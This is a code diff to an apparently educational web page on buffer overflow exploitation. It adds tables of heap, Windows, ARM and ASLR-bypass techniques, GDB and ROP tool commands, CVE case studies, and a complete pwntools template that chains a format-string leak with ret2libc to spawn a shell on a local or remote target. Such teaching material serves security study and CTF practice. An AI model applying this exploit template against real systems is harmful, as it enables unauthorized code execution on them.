@@ -250,6 +250,287 @@ const analysisTools = [
   { name: "AddressSanitizer", category: "Sanitizer", description: "Fast memory error detector" },
 ];
 
+// Advanced heap exploitation techniques
+const heapExploitTechniques = [
+  {
+    name: "Fastbin Attack",
+    description: "Corrupt fastbin free list to get arbitrary allocation",
+    conditions: "Control over freed chunk's fd pointer, same-size allocation",
+    example: "Double free → allocate at GOT/hook → overwrite with one_gadget",
+  },
+  {
+    name: "Tcache Poisoning",
+    description: "Corrupt tcache bin to achieve arbitrary write (glibc 2.26+)",
+    conditions: "UAF or heap overflow on tcache chunk",
+    example: "Overwrite tcache next pointer → allocate at target → write payload",
+  },
+  {
+    name: "House of Force",
+    description: "Overflow top chunk size to allocate anywhere in memory",
+    conditions: "Overflow into top chunk, control allocation size",
+    example: "Set top size to -1 → request huge negative allocation → wrap around to target",
+  },
+  {
+    name: "House of Spirit",
+    description: "Free a fake chunk to get it into freelist",
+    conditions: "Control over memory that can look like valid chunk",
+    example: "Craft fake chunk on stack → free it → allocate returns stack memory",
+  },
+  {
+    name: "Unsorted Bin Attack",
+    description: "Overwrite arbitrary location with main_arena address",
+    conditions: "Control over unsorted chunk's bk pointer",
+    example: "Modify bk → write &unsorted_chunks to target during unlinking",
+  },
+  {
+    name: "Large Bin Attack",
+    description: "Write heap address to arbitrary location",
+    conditions: "Control over large bin chunk's bk_nextsize",
+    example: "Used to overwrite global_max_fast or other targets",
+  },
+];
+
+// Windows-specific exploitation techniques
+const windowsExploitTechniques = [
+  {
+    name: "SEH Overwrite",
+    description: "Overwrite Structured Exception Handler to hijack control flow",
+    mitigation: "SafeSEH, SEHOP",
+    bypass: "Find non-SafeSEH module, or use SEHOP bypass techniques",
+  },
+  {
+    name: "EggHunter",
+    description: "Small shellcode that searches memory for larger payload",
+    use: "When buffer is too small for full shellcode",
+    size: "32-byte stub searches for 'egg' tag (e.g., W00T) in memory",
+  },
+  {
+    name: "Unicode Exploitation",
+    description: "Craft exploits that survive Unicode conversion",
+    challenge: "Many bytes become invalid after UTF-16 encoding",
+    technique: "Use venetian shellcode or Unicode-compatible gadgets",
+  },
+  {
+    name: "Kernel Pool Overflow",
+    description: "Overflow in kernel pool memory for privilege escalation",
+    targets: "Pool metadata, TypeIndex, adjacent allocations",
+    mitigation: "Kernel pool hardening, NonPagedPoolNx",
+  },
+];
+
+// ARM-specific exploitation
+const armExploitTechniques = [
+  {
+    name: "ARM ROP",
+    description: "Return-oriented programming on ARM architecture",
+    difference: "4-byte aligned instructions, LR instead of return address on stack",
+    gadgets: "Look for 'pop {pc}', 'bx lr', 'blx r*' endings",
+  },
+  {
+    name: "Thumb Mode",
+    description: "16-bit instruction mode provides different gadget set",
+    transition: "Switch with 'bx' instruction, LSB of address determines mode",
+    advantage: "More compact gadgets, different instruction encoding",
+  },
+  {
+    name: "ARM64 Exploitation",
+    description: "64-bit ARM with different calling convention",
+    registers: "x0-x7 for arguments, x30 (LR) for return address",
+    challenges: "PAC (Pointer Authentication), BTI (Branch Target Identification)",
+  },
+];
+
+// GDB debugging examples
+const gdbExamples = [
+  {
+    title: "Finding Offset to Return Address",
+    commands: `# Generate pattern
+$ pattern_create 200
+Aa0Aa1Aa2...
+
+# Run program with pattern
+$ gdb ./vulnerable
+(gdb) run "Aa0Aa1Aa2..."
+(gdb) info registers eip
+eip 0x41366441
+
+# Find offset
+$ pattern_offset 0x41366441
+[*] Offset: 76`,
+  },
+  {
+    title: "Examining Stack Frame",
+    commands: `(gdb) break vulnerable_function
+(gdb) run "AAAA"
+(gdb) x/20x $esp        # Examine stack
+(gdb) x/s $ebp+8        # Return address location
+(gdb) info frame        # Stack frame info
+(gdb) backtrace         # Call stack`,
+  },
+  {
+    title: "Finding Gadgets with ROPgadget",
+    commands: `$ ROPgadget --binary ./vulnerable --only "pop|ret"
+0x080484c1 : pop ebx ; ret
+0x080484bf : pop ebp ; ret
+0x08048482 : pop edi ; pop ebp ; ret
+
+$ ROPgadget --binary ./vulnerable --ropchain`,
+  },
+  {
+    title: "Examining Heap Chunks",
+    commands: `(gdb) heap chunks          # pwndbg
+(gdb) bins                  # Show all freelist bins
+(gdb) vis_heap_chunks       # Visual heap layout
+(gdb) p *(struct malloc_chunk *)0x602000`,
+  },
+];
+
+// Detailed CVE case studies
+const detailedCVEStudies = [
+  {
+    cve: "CVE-2021-3156 (Baron Samedit)",
+    name: "Sudo Heap Overflow",
+    discovery: "Qualys Research Team, January 2021",
+    description: "Heap-based buffer overflow in sudo's sudoedit due to incorrect handling of backslash escapes",
+    technical: "Parsing sudoedit command-line arguments with backslashes could write beyond allocated buffer",
+    exploitation: "Craft input to overflow heap, corrupt adjacent chunk, achieve arbitrary write, overwrite service_user pointer",
+    impact: "Local privilege escalation to root on most Linux distributions",
+    patch: "sudo 1.9.5p2 - proper bounds checking in set_cmnd()",
+  },
+  {
+    cve: "CVE-2014-0160 (Heartbleed)",
+    name: "OpenSSL TLS Heartbeat",
+    discovery: "Google Security / Codenomicon, April 2014",
+    description: "Buffer over-read in OpenSSL's TLS heartbeat extension",
+    technical: "Heartbeat request length field not validated against actual payload size",
+    exploitation: "Request heartbeat with large length but small payload; server responds with memory contents",
+    impact: "Remote reading of server memory including private keys, session tokens, passwords",
+    patch: "OpenSSL 1.0.1g - validate payload length against buffer size",
+  },
+  {
+    cve: "CVE-2017-0144 (EternalBlue)",
+    name: "SMBv1 Pool Overflow",
+    discovery: "NSA (leaked by Shadow Brokers), April 2017",
+    description: "Pool buffer overflow in Windows SMBv1 handling of Transaction2 requests",
+    technical: "Integer overflow leads to undersized pool allocation, followed by overflow during data copy",
+    exploitation: "Carefully craft SMB packets to corrupt adjacent pool allocations, achieve code execution",
+    impact: "Remote code execution, used in WannaCry and NotPetya ransomware",
+    patch: "MS17-010 - proper size validation in srv.sys",
+  },
+];
+
+// Complete pwntools exploit template
+const pwntoolsTemplate = `#!/usr/bin/env python3
+from pwn import *
+
+# ===============================
+# Configuration
+# ===============================
+context.update(
+    arch='amd64',
+    os='linux',
+    log_level='info',
+    terminal=['tmux', 'splitw', '-h']
+)
+
+BINARY = './vulnerable'
+LIBC = './libc.so.6'  # Optional: for ret2libc
+
+elf = ELF(BINARY)
+libc = ELF(LIBC) if os.path.exists(LIBC) else None
+
+# ===============================
+# Helper Functions
+# ===============================
+def start(argv=[], *a, **kw):
+    """Start local process or remote connection"""
+    if args.REMOTE:
+        return remote('target.com', 1337)
+    elif args.GDB:
+        return gdb.debug([BINARY] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([BINARY] + argv, *a, **kw)
+
+gdbscript = '''
+break main
+continue
+'''
+
+# ===============================
+# Exploit
+# ===============================
+def exploit():
+    io = start()
+
+    # Step 1: Leak address (if ASLR)
+    io.recvuntil(b"Enter name: ")
+    io.sendline(b"%p.%p.%p.%p.%p.%p")
+    leak = io.recvline()
+    libc_leak = int(leak.split(b'.')[5], 16)
+    libc_base = libc_leak - libc.symbols['__libc_start_main'] - 240
+    log.info(f"Libc base: {hex(libc_base)}")
+
+    # Step 2: Build ROP chain
+    rop = ROP(elf)
+
+    if libc:
+        # ret2libc
+        system = libc_base + libc.symbols['system']
+        binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+        # 64-bit: need to set rdi first
+        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+        ret = rop.find_gadget(['ret'])[0]  # Stack alignment
+
+        payload = flat([
+            b'A' * 72,          # Offset to return address
+            ret,                 # Stack alignment for movaps
+            pop_rdi,
+            binsh,
+            system,
+        ])
+    else:
+        # Simple return address overwrite
+        payload = flat([
+            b'A' * 72,
+            elf.symbols['win'],  # Target function
+        ])
+
+    # Step 3: Send payload
+    io.recvuntil(b"Enter data: ")
+    io.sendline(payload)
+
+    # Step 4: Profit
+    io.interactive()
+
+if __name__ == '__main__':
+    exploit()
+`;
+
+// ASLR bypass techniques
+const aslrBypassTechniques = [
+  {
+    technique: "Information Leak",
+    description: "Read memory address from program output to calculate base addresses",
+    methods: ["Format string to leak stack/libc pointers", "Use-after-free to leak heap metadata", "Partial overwrite (maintain high bytes)"],
+  },
+  {
+    technique: "Brute Force (32-bit)",
+    description: "On 32-bit systems, limited entropy makes brute forcing feasible",
+    methods: ["Only ~12 bits of entropy on some systems", "Network services can be brute forced (256-65536 attempts)", "Child processes inherit parent's ASLR layout"],
+  },
+  {
+    technique: "Return-to-PLT",
+    description: "PLT/GOT entries have known offsets from binary base",
+    methods: ["Binary may not be PIE (fixed base)", "Call PLT entries with controlled arguments", "Chain with GOT overwrite for full control"],
+  },
+  {
+    technique: "Ret2dlresolve",
+    description: "Abuse dynamic linker to resolve arbitrary function",
+    methods: ["Craft fake Elf32_Rel structure", "Trigger _dl_runtime_resolve with fake symbol", "Works without any leaks if binary has enough gadgets"],
+  },
+];
+
 // Prevention methods
 const preventionMethods = [
   {
@@ -1363,6 +1644,116 @@ payload += rop_chain          # Gadgets to setup registers
                 </CodeBlock>
               </AccordionDetails>
             </Accordion>
+
+            {/* Advanced Heap Exploitation */}
+            <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
+              <StorageIcon sx={{ mr: 1, verticalAlign: "middle", color: "#f59e0b" }} />
+              Advanced Heap Exploitation Techniques
+            </Typography>
+            <Grid container spacing={2} sx={{ mb: 4 }}>
+              {heapExploitTechniques.map((tech) => (
+                <Grid item xs={12} md={6} key={tech.name}>
+                  <Card sx={{ height: "100%", borderLeft: `4px solid #f59e0b` }}>
+                    <CardContent>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#f59e0b" }}>{tech.name}</Typography>
+                      <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{tech.description}</Typography>
+                      <Box sx={{ bgcolor: alpha("#f59e0b", 0.05), p: 1, borderRadius: 1, mb: 1 }}>
+                        <Typography variant="caption" sx={{ fontWeight: 600 }}>Conditions: </Typography>
+                        <Typography variant="caption">{tech.conditions}</Typography>
+                      </Box>
+                      <Typography variant="caption" sx={{ fontFamily: "monospace", color: "text.secondary" }}>
+                        {tech.example}
+                      </Typography>
+                    </CardContent>
+                  </Card>
+                </Grid>
+              ))}
+            </Grid>
+
+            {/* ASLR Bypass Techniques */}
+            <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
+              <ShieldIcon sx={{ mr: 1, verticalAlign: "middle", color: "#3b82f6" }} />
+              ASLR Bypass Techniques
+            </Typography>
+            <Grid container spacing={2} sx={{ mb: 4 }}>
+              {aslrBypassTechniques.map((tech) => (
+                <Grid item xs={12} md={6} key={tech.technique}>
+                  <Card sx={{ height: "100%" }}>
+                    <CardContent>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#3b82f6" }}>{tech.technique}</Typography>
+                      <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{tech.description}</Typography>
+                      <List dense>
+                        {tech.methods.map((method, idx) => (
+                          <ListItem key={idx} sx={{ py: 0 }}>
+                            <ListItemIcon sx={{ minWidth: 24 }}>
+                              <ArrowRightIcon sx={{ fontSize: 14, color: "#3b82f6" }} />
+                            </ListItemIcon>
+                            <ListItemText primary={method} primaryTypographyProps={{ variant: "body2" }} />
+                          </ListItem>
+                        ))}
+                      </List>
+                    </CardContent>
+                  </Card>
+                </Grid>
+              ))}
+            </Grid>
+
+            {/* Windows Exploitation */}
+            <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
+              <SecurityIcon sx={{ mr: 1, verticalAlign: "middle", color: "#8b5cf6" }} />
+              Windows-Specific Exploitation
+            </Typography>
+            <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
+              <Table size="small">
+                <TableHead>
+                  <TableRow sx={{ bgcolor: alpha("#8b5cf6", 0.1) }}>
+                    <TableCell sx={{ fontWeight: 700 }}>Technique</TableCell>
+                    <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
+                    <TableCell sx={{ fontWeight: 700 }}>Details</TableCell>
+                  </TableRow>
+                </TableHead>
+                <TableBody>
+                  {windowsExploitTechniques.map((tech) => (
+                    <TableRow key={tech.name}>
+                      <TableCell sx={{ fontWeight: 600 }}>{tech.name}</TableCell>
+                      <TableCell>{tech.description}</TableCell>
+                      <TableCell sx={{ fontSize: "0.8rem" }}>
+                        {tech.mitigation && <><strong>Mitigation:</strong> {tech.mitigation}<br/></>}
+                        {tech.bypass && <><strong>Bypass:</strong> {tech.bypass}</>}
+                        {tech.use && <><strong>Use:</strong> {tech.use}</>}
+                        {tech.size && <><br/><strong>Size:</strong> {tech.size}</>}
+                      </TableCell>
+                    </TableRow>
+                  ))}
+                </TableBody>
+              </Table>
+            </TableContainer>
+
+            {/* ARM Exploitation */}
+            <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
+              <MemoryIcon sx={{ mr: 1, verticalAlign: "middle", color: "#22c55e" }} />
+              ARM Architecture Exploitation
+            </Typography>
+            <Grid container spacing={2}>
+              {armExploitTechniques.map((tech) => (
+                <Grid item xs={12} md={4} key={tech.name}>
+                  <Card sx={{ height: "100%", borderTop: `3px solid #22c55e` }}>
+                    <CardContent>
+                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e" }}>{tech.name}</Typography>
+                      <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{tech.description}</Typography>
+                      <Box sx={{ bgcolor: alpha("#22c55e", 0.05), p: 1, borderRadius: 1 }}>
+                        <Typography variant="caption" sx={{ display: "block", mb: 0.5 }}>
+                          <strong>{tech.difference ? "Key Difference" : tech.transition ? "Mode Transition" : "Registers"}:</strong>
+                        </Typography>
+                        <Typography variant="caption">
+                          {tech.difference || tech.transition || tech.registers}
+                        </Typography>
+                      </Box>
+                    </CardContent>
+                  </Card>
+                </Grid>
+              ))}
+            </Grid>
           </Box>
         )}
 
@@ -1391,14 +1782,14 @@ payload += rop_chain          # Gadgets to setup registers
                       <TableCell sx={{ fontWeight: 600 }}>{cve.name}</TableCell>
                       <TableCell>{cve.type}</TableCell>
                       <TableCell>
-                        <Chip 
-                          label={cve.impact} 
-                          size="small" 
-                          sx={{ 
+                        <Chip
+                          label={cve.impact}
+                          size="small"
+                          sx={{
                             bgcolor: alpha("#dc2626", 0.15),
                             color: "#dc2626",
                             fontWeight: 600,
-                          }} 
+                          }}
                         />
                       </TableCell>
                       <TableCell>{cve.year}</TableCell>
@@ -1408,7 +1799,55 @@ payload += rop_chain          # Gadgets to setup registers
               </Table>
             </TableContainer>
 
-            <Accordion sx={{ borderRadius: 2, mb: 2 }}>
+            {/* Detailed CVE Case Studies */}
+            <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
+              <BugReportIcon sx={{ mr: 1, verticalAlign: "middle", color: "#dc2626" }} />
+              Detailed Case Studies
+            </Typography>
+            {detailedCVEStudies.map((study) => (
+              <Accordion key={study.cve} sx={{ mb: 2 }}>
+                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
+                  <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
+                    <Chip label={study.cve.split(" ")[0]} size="small" sx={{ bgcolor: alpha("#dc2626", 0.1), color: "#dc2626" }} />
+                    <Typography sx={{ fontWeight: 700 }}>{study.name}</Typography>
+                  </Box>
+                </AccordionSummary>
+                <AccordionDetails>
+                  <Grid container spacing={2}>
+                    <Grid item xs={12} md={6}>
+                      <Box sx={{ mb: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Discovery</Typography>
+                        <Typography variant="body2">{study.discovery}</Typography>
+                      </Box>
+                      <Box sx={{ mb: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Description</Typography>
+                        <Typography variant="body2">{study.description}</Typography>
+                      </Box>
+                      <Box>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Technical Details</Typography>
+                        <Typography variant="body2">{study.technical}</Typography>
+                      </Box>
+                    </Grid>
+                    <Grid item xs={12} md={6}>
+                      <Box sx={{ mb: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>Exploitation</Typography>
+                        <Typography variant="body2">{study.exploitation}</Typography>
+                      </Box>
+                      <Box sx={{ mb: 2, p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626" }}>Impact</Typography>
+                        <Typography variant="body2">{study.impact}</Typography>
+                      </Box>
+                      <Box sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
+                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e" }}>Patch</Typography>
+                        <Typography variant="body2">{study.patch}</Typography>
+                      </Box>
+                    </Grid>
+                  </Grid>
+                </AccordionDetails>
+              </Accordion>
+            ))}
+
+            <Accordion sx={{ borderRadius: 2, mb: 2, mt: 4 }}>
               <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                 <Typography sx={{ fontWeight: 600 }}>
                   <HistoryIcon sx={{ mr: 1, verticalAlign: "middle", color: "#f59e0b" }} />
@@ -1422,9 +1861,12 @@ payload += rop_chain          # Gadgets to setup registers
                     { year: "1996", event: "Aleph One publishes 'Smashing the Stack for Fun and Profit'" },
                     { year: "2001", event: "Code Red worm exploits IIS buffer overflow" },
                     { year: "2003", event: "SQL Slammer worm spreads via SQL Server overflow" },
+                    { year: "2008", event: "Conficker worm exploits MS08-067 buffer overflow" },
                     { year: "2014", event: "Heartbleed (CVE-2014-0160) disclosed" },
                     { year: "2017", event: "EternalBlue leaked, WannaCry ransomware" },
+                    { year: "2019", event: "BlueKeep RDP vulnerability (CVE-2019-0708)" },
                     { year: "2021", event: "Baron Samedit sudo heap overflow" },
+                    { year: "2022", event: "Dirty Pipe kernel vulnerability (CVE-2022-0847)" },
                   ].map((item, idx) => (
                     <ListItem key={idx}>
                       <ListItemIcon>
@@ -1454,9 +1896,9 @@ payload += rop_chain          # Gadgets to setup registers
                       <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>
                         {tool.name}
                       </Typography>
-                      <Chip 
-                        label={tool.category} 
-                        size="small" 
+                      <Chip
+                        label={tool.category}
+                        size="small"
                         sx={{ mb: 1, mt: 0.5 }}
                         color="primary"
                         variant="outlined"
@@ -1470,36 +1912,142 @@ payload += rop_chain          # Gadgets to setup registers
               ))}
             </Grid>
 
-            <Accordion sx={{ borderRadius: 2, mt: 4 }}>
+            {/* GDB Debugging Examples */}
+            <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
+              <BuildIcon sx={{ mr: 1, verticalAlign: "middle", color: "#8b5cf6" }} />
+              GDB Debugging Examples
+            </Typography>
+            <Grid container spacing={2} sx={{ mb: 4 }}>
+              {gdbExamples.map((example) => (
+                <Grid item xs={12} md={6} key={example.title}>
+                  <Card sx={{ height: "100%" }}>
+                    <CardContent>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
+                        {example.title}
+                      </Typography>
+                      <Box sx={{ bgcolor: alpha("#8b5cf6", 0.03), p: 2, borderRadius: 2 }}>
+                        <pre style={{ margin: 0, fontSize: "0.75rem", fontFamily: "monospace", whiteSpace: "pre-wrap", overflow: "auto" }}>
+                          {example.commands}
+                        </pre>
+                      </Box>
+                    </CardContent>
+                  </Card>
+                </Grid>
+              ))}
+            </Grid>
+
+            <Accordion defaultExpanded sx={{ borderRadius: 2, mt: 4, mb: 2 }}>
               <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                 <Typography sx={{ fontWeight: 600 }}>
-                  <BuildIcon sx={{ mr: 1, verticalAlign: "middle", color: "#3b82f6" }} />
-                  pwntools Basic Usage
+                  <CodeIcon sx={{ mr: 1, verticalAlign: "middle", color: "#3b82f6" }} />
+                  Complete pwntools Exploit Template
                 </Typography>
               </AccordionSummary>
               <AccordionDetails>
+                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
+                  A production-ready pwntools template with ASLR bypass, ROP chain building, and remote/local targeting.
+                </Typography>
                 <CodeBlock title="Python pwntools exploit template">
-{`from pwn import *
-
-# Set context for target architecture
-context.arch = 'i386'  # or 'amd64'
-context.os = 'linux'
-
-# Connect to target
-# p = process('./vulnerable')  # Local
-# p = remote('target.com', 1337)  # Remote
-
-# Create payload
-payload = b"A" * 64          # Padding
-payload += p32(0xdeadbeef)   # Return address (32-bit)
-# payload += p64(0xdeadbeef) # Return address (64-bit)
-
-# Send payload
-p.sendline(payload)
-
-# Interact with shell
-p.interactive()`}
+                  {pwntoolsTemplate}
                 </CodeBlock>
+              </AccordionDetails>
+            </Accordion>
+
+            <Accordion sx={{ borderRadius: 2, mb: 2 }}>
+              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
+                <Typography sx={{ fontWeight: 600 }}>
+                  <BuildIcon sx={{ mr: 1, verticalAlign: "middle", color: "#22c55e" }} />
+                  Essential Tool Commands
+                </Typography>
+              </AccordionSummary>
+              <AccordionDetails>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>checksec</Typography>
+                    <CodeBlock title="Check binary protections">
+{`$ checksec --file=./binary
+RELRO           STACK CANARY      NX            PIE
+Full RELRO      Canary found      NX enabled    PIE enabled
+
+$ checksec --fortify-file=./binary`}
+                    </CodeBlock>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>one_gadget</Typography>
+                    <CodeBlock title="Find one-shot RCE gadgets in libc">
+{`$ one_gadget ./libc.so.6
+0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f302 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL`}
+                    </CodeBlock>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>ropper</Typography>
+                    <CodeBlock title="Find ROP gadgets">
+{`$ ropper --file ./binary --search "pop rdi"
+0x0000000000401233: pop rdi; ret;
+
+$ ropper --file ./binary --chain execve
+[INFO] Generating rop chain...`}
+                    </CodeBlock>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>patchelf</Typography>
+                    <CodeBlock title="Modify binary for local testing">
+{`# Use specific libc for testing
+$ patchelf --set-interpreter ./ld-linux.so.2 ./binary
+$ patchelf --set-rpath . ./binary
+$ patchelf --replace-needed libc.so.6 ./libc.so.6 ./binary`}
+                    </CodeBlock>
+                  </Grid>
+                </Grid>
+              </AccordionDetails>
+            </Accordion>
+
+            <Accordion sx={{ borderRadius: 2, mb: 2 }}>
+              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
+                <Typography sx={{ fontWeight: 600 }}>
+                  <MemoryIcon sx={{ mr: 1, verticalAlign: "middle", color: "#f59e0b" }} />
+                  pwndbg / GEF GDB Extensions
+                </Typography>
+              </AccordionSummary>
+              <AccordionDetails>
+                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
+                  Enhanced GDB extensions for exploit development. Install pwndbg or GEF for these features.
+                </Typography>
+                <Grid container spacing={2}>
+                  <Grid item xs={12} md={6}>
+                    <Box sx={{ bgcolor: alpha("#f59e0b", 0.03), p: 2, borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Heap Commands</Typography>
+                      <pre style={{ margin: 0, fontSize: "0.75rem", fontFamily: "monospace" }}>
+{`heap              # Show heap overview
+bins              # Show all freelist bins
+vis_heap_chunks   # Visual heap layout
+fastbins          # Show fastbin contents
+tcachebins        # Show tcache contents
+arena             # Show arena info`}
+                      </pre>
+                    </Box>
+                  </Grid>
+                  <Grid item xs={12} md={6}>
+                    <Box sx={{ bgcolor: alpha("#f59e0b", 0.03), p: 2, borderRadius: 2 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Exploit Commands</Typography>
+                      <pre style={{ margin: 0, fontSize: "0.75rem", fontFamily: "monospace" }}>
+{`rop               # Show ROP gadgets
+vmmap             # Memory map
+search -s "flag"  # Search memory
+cyclic 200        # Generate pattern
+cyclic -l 0x6161  # Find offset
+got               # Show GOT entries`}
+                      </pre>
+                    </Box>
+                  </Grid>
+                </Grid>
               </AccordionDetails>
             </Accordion>
           </Box>
